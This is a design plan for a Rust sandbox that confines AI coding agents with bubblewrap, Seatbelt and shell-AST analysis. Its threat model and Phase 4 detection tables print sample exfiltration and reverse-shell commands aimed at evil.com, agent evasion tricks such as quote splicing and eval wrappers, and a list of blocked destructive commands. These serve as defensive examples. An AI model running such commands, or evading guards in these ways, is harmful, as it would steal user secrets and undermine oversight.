# Heimdall Sandbox — Design & Implementation Plan

## Problem

AI coding agents with `bash` tool access can read any file the user can read, access any network service, and exfiltrate data. Application-layer guards (blocking specific commands, redacting output) don't enforce OS-level isolation. A compromised or misbehaving agent can bypass these guards with creative shell invocations.

This project is a native Rust binary (`heimdall-sandbox`) that provides OS-level sandboxing. On Linux, it uses bubblewrap (bwrap) for filesystem namespace isolation combined with seccomp-BPF for syscall-level restrictions. On macOS, it uses Seatbelt (`sandbox-exec`). The architecture follows the [Codex sandbox model](../codex/codex-rs/sandboxing/).

## Threat Model

### What we protect against

- **Filesystem exfiltration**: Agent reads `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config`, or any file outside the project directory
- **Environment variable leaks**: Agent reads `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, or other secrets from `process.env`
- **Process inspection**: Agent ptraces other processes to read their memory
- **Dynamic library injection**: Agent uses `LD_PRELOAD` / `DYLD_*` to intercept or exfiltrate
- **Shell evasion**: Agent uses `bash -c`, `timeout`, `eval`, quote splicing, or escape handling to disguise commands
- **Exfiltration patterns**: Reverse shells, DNS exfil, base64 pipes, file uploads via curl, env dumps to network

### What we accept for now

- **Network access (when enabled)**: Agent can reach any network destination when `network_access = true`. Protection comes from filesystem lockdown (nothing valuable to exfiltrate) + existing heimdall secret-guard redaction.
- **No seccomp initially on Linux**: Syscall filtering beyond what bwrap provides. Added later as defense-in-depth.

## Architecture

### Platform dispatch

| Platform | Filesystem | Network | Process hardening |
|----------|-----------|---------|-------------------|
| Linux | bubblewrap (bwrap) | bwrap `--unshare-net` + seccomp (future) | `PR_SET_DUMPABLE=0`, `RLIMIT_CORE=0`, strip `LD_*` |
| macOS | Seatbelt (`/usr/bin/sandbox-exec`) | Seatbelt network policy | `PT_DENY_ATTACH`, `RLIMIT_CORE=0`, strip `DYLD_*` |

### Data flow

```
Caller (pi-heimdall TS extension)
    │
    ▼
heimdall-sandbox exec --cwd <dir> [--allow-env <KEY>]... -- <command>
    │
    ├── Parse args-only runtime request
    ├── Process hardening (pre-exec)
    │   ├── PR_SET_DUMPABLE=0 / PT_DENY_ATTACH
    │   ├── RLIMIT_CORE=0
    │   └── Strip LD_* / DYLD_* env vars
    │
    ├── Platform dispatch
    │   │
    │   ├── [Linux] bwrap pipeline
    │   │   ├── Build bwrap argv from CLI/core request arguments
    │   │   ├── Apply env stripping (allowlist only)
    │   │   ├── Create synthetic /etc files (passwd, group)
    │   │   ├── fork → exec bwrap
    │   │   ├── Stream stdout/stderr
    │   │   ├── Forward signals (SIGHUP, SIGINT, SIGQUIT, SIGTERM)
    │   │   └── Return exit code
    │   │
    │   └── [macOS] Seatbelt pipeline
    │       ├── Build Seatbelt policy (.sbpl)
    │       ├── Apply env stripping
    │       ├── exec /usr/bin/sandbox-exec
    │       ├── Stream stdout/stderr
    │       └── Return exit code
    │
    ▼
Exit code:
  0  — command succeeded
  1  — command failed
  2  — sandbox misconfiguration
  3  — command blocked by policy
  4  — exfiltration pattern detected (future)
```

## Linux: Bubblewrap Pipeline

### Two-stage architecture (following Codex)

```
Stage 1 (outer):
  heimdall-sandbox exec --cwd <dir> -- <command>
    → build bwrap args
    → fork → bwrap → re-enter self with --apply-seccomp-then-exec

Stage 2 (inner, inside bwrap namespace):
  heimdall-sandbox --apply-seccomp-then-exec -- <command>
    → apply seccomp-BPF (future)
    → execvp <command>
```

This two-stage design ensures seccomp filters apply *inside* the bwrap namespace where the filesystem is already locked down. The outer stage constructs the filesystem view; the inner stage tightens syscall restrictions.

### bwrap argument construction

Following Codex's layered mount model:

```
# Full disk read: start with read-only root
--ro-bind / /

# OR restricted read: start with empty root and add only approved paths
--tmpfs /
--ro-bind /usr /usr
--ro-bind /lib /lib
--ro-bind /lib64 /lib64
--ro-bind /bin /bin
--ro-bind /sbin /sbin

# Minimal /dev (null, zero, random, urandom, tty)
--dev /dev

# Real /etc for DNS, TLS (read-only)
--ro-bind /etc/resolv.conf /etc/resolv.conf
--ro-bind /etc/hosts /etc/hosts
--ro-bind /etc/ssl /etc/ssl
--ro-bind /etc/ca-certificates /etc/ca-certificates

# Synthetic /etc (hide host info)
--ro-bind-data <fd> /etc/passwd
--ro-bind-data <fd> /etc/group

# Writable roots (project dir, /tmp)
--bind <project> <project>
--bind /tmp /tmp

# Read-only overrides for protected subpaths inside writable roots
--ro-bind <project>/.git <project>/.git
--ro-bind <project>/.agents <project>/.agents

# Namespace isolation
--unshare-user
--unshare-pid
--unshare-net            # only when network disabled

# /proc
--proc /proc

# Lifecycle
--die-with-parent
--new-session

# Command
-- <command>
```

Mount ordering is critical (Codex lesson):
1. Read-only root (full disk or restricted)
2. `/dev` (minimal device nodes)
3. Real `/etc` files (DNS, TLS)
4. Synthetic `/etc` files (passwd, group)
5. Writable roots (project, `/tmp`)
6. Read-only overrides for protected subpaths (`.git`, `.agents`)
7. Unreadable glob pattern matches masked with `/dev/null`
8. Namespace isolation flags
9. Lifecycle flags
10. Command

### Synthetic /etc files

Created in-process, passed via `--ro-bind-data` (file descriptor):

| File | Content | Purpose |
|------|---------|---------|
| `/etc/passwd` | `nobody:x:65534:65534:Nobody:/nonexistent:/usr/sbin/nologin\n` | Hide real usernames |
| `/etc/group` | `nogroup:x:65534:\n` | Hide real group memberships |

### Real /etc files (mounted read-only)

| File | Why real |
|------|----------|
| `/etc/resolv.conf` | DNS resolution (Tailscale MagicDNS) |
| `/etc/hosts` | Hostname resolution (Tailscale) |
| `/etc/ssl/certs/` | TLS certificate verification |
| `/etc/ca-certificates/` | CA bundle (alternative cert path) |

### Unreadable glob patterns

Codex uses ripgrep to expand deny-read glob patterns into concrete paths, then masks each match with `/dev/null` via `--ro-bind /dev/null <path>`. This prevents the sandboxed process from reading `.env` files even inside writable roots.

Supported patterns: `**/.env`, `**/.env.local`, `**/.env.*.local`

### bwrap discovery

Follow Codex's launcher approach:
1. Search `PATH` for system `bwrap` binary
2. Verify it's a real file (not an attacker injection)
3. Probe for `--argv0` support (added in bwrap v0.9.0)
4. If no system bwrap found: vendored bwrap compiled into the binary (future)
5. If neither available: exit with code 2 and clear error message

### Signal forwarding

Forward SIGHUP, SIGINT, SIGQUIT, SIGTERM from parent to bwrap child process group. Block these signals during setup to avoid races, then install handlers. Use `PR_SET_PDEATHSIG` in the child so bwrap dies if the parent crashes.

## macOS: Seatbelt Pipeline

### Policy construction

Seatbelt uses a nested S-expressions policy language (`.sbpl`). Following Codex's approach:

1. Start with deny-by-default base policy (inspired by Chrome's sandbox)
2. Layer filesystem read/write permissions based on CLI/core request arguments
3. Layer network policy (full access, restricted, or none)
4. Allow process fork/exec for child commands
5. Allow necessary sysctl reads, IOKit, mach-lookup for system services
6. Allow PTY access for interactive shells

Base policy allows:
- Process fork/exec (child inherits policy)
- `/dev/null` writes
- System sysctls (CPU, memory, OS info)
- `com.apple.system.opendirectoryd.libinfo` (user lookup)
- `pseudo-tty` and `/dev/ptmx` (interactive shells)
- IPC posix semaphores (Python multiprocessing)
- Read-only user preferences

Network policy adds (when enabled):
- `system-socket` for AF_SYSTEM
- Mach lookup for SecurityServer, networkd, ocspd, trustd (TLS)
- DNS configuration access
- Darwin user cache dir writes

### Seatbelt invocation

```bash
/usr/bin/sandbox-exec -p "<policy>" -D<KEY>=<VALUE> ... -- <command>
```

Only `/usr/bin/sandbox-exec` is used (not PATH lookup) to prevent injection. If an attacker can tamper with `/usr/bin/sandbox-exec`, they already have root.

### Filesystem policy in Seatbelt

```
; Deny by default
(deny default)

; Writable roots
(allow file-write*
  (subpath (param "WRITABLE_ROOT_0")))

; Read-only roots
(allow file-read*
  (subpath (param "READABLE_ROOT_0")))

; Protected subpaths remain read-only inside writable roots
(allow file-write*
  (require-all
    (subpath (param "WRITABLE_ROOT_0"))
    (require-not (subpath (param "WRITABLE_ROOT_0_EXCLUDED_0")))))

; Deny-read glob patterns translated to regex
(deny file-read* (regex #"^/path/to/project/\.env(/.*)?$"))
```

### Network policy in Seatbelt

```
; Full network access
(allow network-outbound)
(allow network-inbound)

; Or: restricted (proxy-only)
(allow network-outbound (remote ip "localhost:<proxy_port>"))

; Or: no network (nothing added)
```

## Process Hardening

Applied before any sandbox construction, in the heimdall-sandbox process itself:

| Platform | Hardening |
|----------|----------|
| Linux | `PR_SET_DUMPABLE=0` (no ptrace), `RLIMIT_CORE=0` (no core dumps), strip `LD_*` env vars |
| macOS | `PT_DENY_ATTACH` (no debuggers), `RLIMIT_CORE=0` (no core dumps), strip `DYLD_*` env vars |

## Environment Variable Stripping

Only env vars explicitly allowlisted by runtime inputs pass through to the sandboxed process. In the CLI, allowlisting is args-only via repeated `--allow-env <KEY>`.

Everything not explicitly allowed (`AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, `GITHUB_TOKEN`, etc.) is stripped before exec.

The `LD_*` / `DYLD_*` stripping happens in the hardening phase (pre-main) as defense-in-depth.

## Runtime Inputs

The CLI is args-only. It does not load TOML, JSON, or any other config file. The JavaScript side owns higher-level configuration and translates it into explicit CLI arguments.

If configuration is needed outside the CLI, it should live in the JavaScript integration layer. If a native config format is ever added for non-CLI callers, JSON is preferred, but that is out of scope for the CLI.

## CLI Interface

```
heimdall-sandbox exec [OPTIONS] -- <command>

Options:
  --cwd <DIR>                  Working directory (required)
  --allow-env <KEY>            Preserve one environment variable; repeatable
  --network <full|isolated>    Network mode (future platform sandbox argument)
  --ro-bind <SRC:DST>          Additional read-only bind mount (future Linux argument)
  --bind <SRC:DST>             Additional read-write bind mount (future Linux argument)
  --deny-read <GLOB>           Deny reading files matching glob (future argument)
  --apply-seccomp-then-exec    (internal) Apply seccomp inside bwrap, then exec
  --no-proc                    Skip mounting /proc (container compat)
  -v, --verbose                Verbose output (show bwrap/seatbelt args)
  -h, --help                   Show help
  -V, --version                Show version

Exit codes:
  0  — command succeeded
  1  — command failed
  2  — sandbox misconfiguration (bwrap not found, invalid args)
  3  — command blocked by policy
  4  — exfiltration pattern detected (future)
```

## Technology Choices

| Component | Choice | Why |
|-----------|--------|-----|
| Language | Rust | Memory safety, native platform APIs, zero overhead |
| CLI | clap | De facto Rust standard |
| Workspace split | `heimdall-core` + `heimdall-sandbox` | Reusable runtime now, native bindings later |
| Linux filesystem | bubblewrap (bwrap) | Battle-tested namespace isolation |
| Linux seccomp | seccompiler crate (future) | Verified BPF program generation |
| macOS filesystem + network | Seatbelt (sandbox-exec) | Apple's supported sandboxing API |
| Shell parsing | tree-sitter-bash (future) | Proper AST for evasion detection |
| Process hardening | libc (prctl/ptrace/setrlimit) | Direct syscall wrappers |

## Project Structure

```
heimdall/
├── Cargo.toml                  ← Workspace manifest
├── crates/
│   ├── heimdall-core/
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs          ← Public core API
│   │       ├── env.rs          ← Environment variable stripping
│   │       ├── exec.rs         ← Command execution, signal forwarding, exit codes
│   │       ├── harden.rs       ← Process hardening (platform-specific)
│   │       ├── platform/
│   │       │   ├── mod.rs      ← Platform dispatch
│   │       │   ├── linux.rs    ← Linux: bwrap arg construction, synthetic /etc, fork/exec
│   │       │   └── macos.rs    ← macOS: Seatbelt policy generation, exec sandbox-exec
│   │       ├── shell/          ← tree-sitter shell analysis (future)
│   │       ├── exfiltration.rs ← Exfiltration pattern detection (future)
│   │       └── policy.rs       ← Command policy enforcement (future)
│   └── heimdall-sandbox/
│       ├── Cargo.toml
│       └── src/
│           └── main.rs         ← Args-only CLI wrapper around heimdall-core
├── tests/
│   └── integration.rs          ← Integration tests (require bwrap on Linux)
└── SANDBOX-PLAN.md
```

## Distribution

Plain binaries for each platform. No cross-compilation magic — build natively on each target.

```
@casualjim/heimdall-sandbox              ← main package (JS wrapper)
@casualjim/heimdall-sandbox-linux-x64    ← optionalDependency
@casualjim/heimdall-sandbox-linux-arm64  ← optionalDependency
@casualjim/heimdall-sandbox-darwin-x64   ← optionalDependency
@casualjim/heimdall-sandbox-darwin-arm64 ← optionalDependency
```

Each platform package contains a single pre-built binary. The main package resolves the correct one.

Build: `cargo build --release` on each target platform. CI runs on x86_64 Linux, aarch64 Linux, x86_64 macOS, aarch64 macOS.

## Implementation Order

### Phase 1: Core infrastructure
1. Convert repository to a Cargo workspace
2. Create `heimdall-core` library crate and `heimdall-sandbox` binary crate
3. Implement args-only CLI skeleton (`exec` subcommand, no config loading)
4. Process hardening (platform-specific)
5. Environment variable stripping from explicit `--allow-env` arguments
6. Signal forwarding and exit code handling

### Phase 2: Linux bwrap sandbox
6. bwrap arg construction (filesystem mounts)
7. Synthetic /etc file generation
8. Two-stage pipeline (bwrap → re-enter → seccomp)
9. bwrap discovery (system PATH, probe for `--argv0`)
10. Unreadable glob expansion (ripgrep or glob crate)
11. Protected subpath handling (`.git`, `.agents`)
12. `/proc` mount with preflight fallback (container compat)
13. Integration tests

### Phase 3: macOS Seatbelt sandbox
14. Seatbelt base policy (deny-default + system allows)
15. Filesystem policy generation (read/write roots, deny-read globs)
16. Network policy generation (full/restricted/none)
17. `/usr/bin/sandbox-exec` invocation
18. Darwin user cache dir and confstr handling
19. Integration tests

### Phase 4: Shell analysis & advanced features

20. **Shell parsing module** (adapted from zage)
21. **Command policy enforcement** (allow/block based on parsed command)
22. **Exfiltration pattern detection** (AST-based network + file access combos)
23. **Seccomp-BPF on Linux** (ptrace, io_uring, process_vm_readv/writev)
24. **Managed proxy routing** (TCP↔UDS bridge for controlled outbound)
25. **Vendored bwrap fallback** on Linux
26. **npm package distribution**

---

## Phase 4 Detailed Design

### Shell parsing (adapted from zage)

The [zage](../zage/) project already has a mature shell tokenizer that uses `tree-sitter-bash` and `tree-sitter-zsh` with a fallback hand-written lexer. We adapt its architecture for heimdall's security-focused needs.

**Key difference from zage**: zage normalizes tokens for indexing (replaces paths with `PATH`, variables with `VAR`, etc.). Heimdall needs the *raw* tokens and AST structure to detect evasion and exfiltration patterns. We reuse the tokenizer and command-parts extraction but replace the normalization with security-focused analysis.

#### What we reuse from zage

From `zage/src/tokenize/`:

- **`tree_sitter.rs`**: Thread-local `tree-sitter-bash` and `tree-sitter-zsh` parsers. Parses shell input into an AST, walks nodes to extract tokens. Falls back gracefully on parse errors.
- **`lexer.rs`**: Hand-written fallback tokenizer. Handles operators (`|`, `||`, `&&`, `;`), redirects (`>`, `<`, `>>`, `&>`), quoted strings, escaped characters, word boundaries.
- **`command_parts.rs`**: `extract_command_parts()` — parses a token stream into `CommandParts { head, env, flags, args }`. Handles env var assignments (`FOO=bar cmd`), flag extraction, subcommand promotion (`git commit` → head="git commit"), redirect skipping.
- **`Token` / `TokenKind` types**: `Word`, `Operator`, `Redirect`, `Quoted`, `Assignment`, `Variable`.

#### What we change for heimdall

- **Remove normalization**: zage's `normalize()` replaces paths with `PATH`, variables with `VAR`, IPs with `IP`. Heimdall needs actual values to check against policies.
- **Add pipeline extraction**: Parse multi-command pipelines (`cmd1 | cmd2 && cmd3`) into separate `CommandParts` per pipeline segment.
- **Add redirect target extraction**: Track redirect targets (file paths, file descriptors) for exfiltration detection.
- **Add command substitution analysis**: Detect `$(...)` and backtick subshells, recursively parse their contents.

#### New module structure

```
crates/heimdall-core/src/shell/
├── mod.rs              ← public API: parse_command(), ShellAnalysis
├── tokenize.rs         ← adapted from zage (tree-sitter + fallback lexer)
├── command_parts.rs    ← adapted from zage (head/env/flags/args extraction)
├── pipeline.rs         ← NEW: multi-command pipeline extraction
├── evasion.rs          ← NEW: evasion pattern detection
└── analysis.rs         ← NEW: security-focused analysis combining all above
```

#### ShellAnalysis output

```rust
struct ShellAnalysis {
    /// All commands in the pipeline (e.g. `a | b && c` → 3 commands)
    commands: Vec<AnalyzedCommand>,
    /// Detected evasion techniques
    evasion_flags: Vec<EvasionKind>,
    /// Detected exfiltration patterns
    exfiltration_flags: Vec<ExfiltrationKind>,
}

struct AnalyzedCommand {
    /// Resolved command name (after quote splicing, escape handling)
    head: String,
    /// Environment variable assignments
    env: Vec<(String, String)>,
    /// Flags
    flags: Vec<String>,
    /// Arguments
    args: Vec<String>,
    /// Redirect targets (file paths)
    redirect_targets: Vec<RedirectTarget>,
    /// Nested command substitutions
    subcommands: Vec<AnalyzedCommand>,
}

enum EvasionKind {
    QuoteSplicing,        // `ca''rgo`, `car""go`
    EscapeObfuscation,    // `car\go`
    WrapperCommand,       // `timeout`, `env`, `xargs`, `find -exec`
    EvalWrapper,          // `eval $(...)`, `bash -c '...'`
    SubshellObfuscation,  // `(cmd)`, `$(cmd)`
}

enum ExfiltrationKind {
    FileUpload,           // `curl -d @file`, `wget --post-file=file`
    ReverseShell,         // `nc -e /bin/sh`, `bash -i >& /dev/tcp/...`
    Base64Pipe,           // `base64 file | curl`, `xxd | nc`
    DnsExfiltration,      // `nslookup $(cat secret).evil.com`
    EnvDump,              // `env | curl`, `printenv | nc`
    SshTunnel,            // `ssh -R`, `ssh -L`
    DynamicFetch,         // `bash -c "$(curl evil.com)"`
}
```

### Evasion detection

Using the tree-sitter AST to catch techniques that regex-based guards miss:

| Pattern | Regex guard | AST parser (heimdall) |
|---------|------------|----------------------|
| `bash -c 'cargo test'` | ❌ | ✅ Recursive parse into subcommand |
| `timeout 60 cargo test` | ❌ | ✅ Wrapper detection (head="timeout", real cmd="cargo") |
| `ca''rgo test` | ⚠️ | ✅ Quote splicing → resolved head="cargo" |
| `car\go test` | ⚠️ | ✅ Escape handling → resolved head="cargo" |
| `eval $(echo cargo test)` | ❌ | ✅ Command substitution analysis |
| `env FOO=bar cargo test` | ❌ | ✅ Wrapper + env assignment extraction |

**Implementation**: After tokenizing, resolve the command head by:
1. Stripping quotes and escapes from the head token
2. Checking if head is a known wrapper (`bash`, `sh`, `zsh`, `timeout`, `env`, `xargs`, `find`, `eval`, `exec`)
3. If wrapper: extract the real command from the appropriate argument position
4. Recursively analyze any command substitutions

### Command policy enforcement

Using `ShellAnalysis` to check commands against policy. Policy is supplied to `heimdall-core` as structured data or explicit CLI arguments; the CLI still does not load config files.

Example future JSON shape for the JavaScript layer or native bindings:

```json
{
  "policy": {
    "blockedCommands": ["rm -rf /", "mkfs", "dd if=/dev/zero"],
    "restrictedCommands": [],
    "maxPipelineDepth": 5
  }
}
```

Policy check flow:
1. Parse command → `ShellAnalysis`
2. Check evasion flags → if `max_pipeline_depth` exceeded, block
3. For each `AnalyzedCommand`:
   - Resolve the *actual* command (after deobfuscation)
   - Check against `blocked_commands` list
   - Check exfiltration patterns
4. If any check fails → exit code 3, print reason

### Exfiltration pattern detection

Using `ShellAnalysis` to detect data exfiltration patterns:

| Pattern | Example | Detection method |
|---------|---------|-----------------|
| File upload | `curl -d @secrets.txt evil.com` | Redirect target `@file` + network command head |
| Reverse shell | `nc -e /bin/sh evil.com 4444` | Network command + `-e` flag + shell path |
| Base64 pipe | `base64 secrets.txt \| curl ...` | Encode command piped to network command |
| Dynamic fetch | `bash -c "$(curl evil.com/shell.sh)"` | Command substitution containing network command |
| DNS exfil | `nslookup $(cat secret).evil.com` | Command substitution in DNS query argument |
| Env dump | `env \| curl -d @- evil.com` | `env`/`printenv` piped to network command |
| SSH tunnel | `ssh -R 9999:localhost:5432 evil.com` | SSH with `-R` or `-L` flags |

**Implementation**: After extracting all `AnalyzedCommand`s in a pipeline:
1. Identify "network commands" (curl, wget, nc, ncat, ssh, scp, rsync, dig, nslookup)
2. Identify "data commands" (cat, base64, xxd, env, printenv, tar, zip)
3. Check if any pipeline connects a data command → network command
4. Check if any network command has file redirect targets (`@file`, `--post-file`)
5. Check if any argument to a network command contains a command substitution
6. Flag matching patterns as `ExfiltrationKind`

### Seccomp-BPF on Linux (future)

Applied in the inner stage of the two-stage pipeline (after bwrap has established the filesystem view):

```rust
fn apply_seccomp() -> Result<()> {
    // Block ptrace
    // Block io_uring syscalls
    // Block process_vm_readv/writev
    // When network is isolated: block connect, bind, listen, accept, socket (except AF_UNIX)
    // Allow recvfrom (cargo clippy uses socketpair)
}
```

### Managed proxy routing (future)

Following Codex's TCP↔UDS bridge pattern for controlled outbound access:

```
Host bridge:     TCP <proxy_host>:<proxy_port> ↔ UDS /tmp/heimdall-proxy-<rand>.sock
Sandbox bridge:  UDS (passes through namespace) ↔ TCP 127.0.0.1:<rand_port> (inside netns)
```

- Rewrite `HTTP_PROXY`/`HTTPS_PROXY` env vars to point to sandbox-internal bridge
- Seccomp blocks AF_UNIX to prevent bypass
- Only enabled when proxy env vars are present and `--allow-network-for-proxy` is set
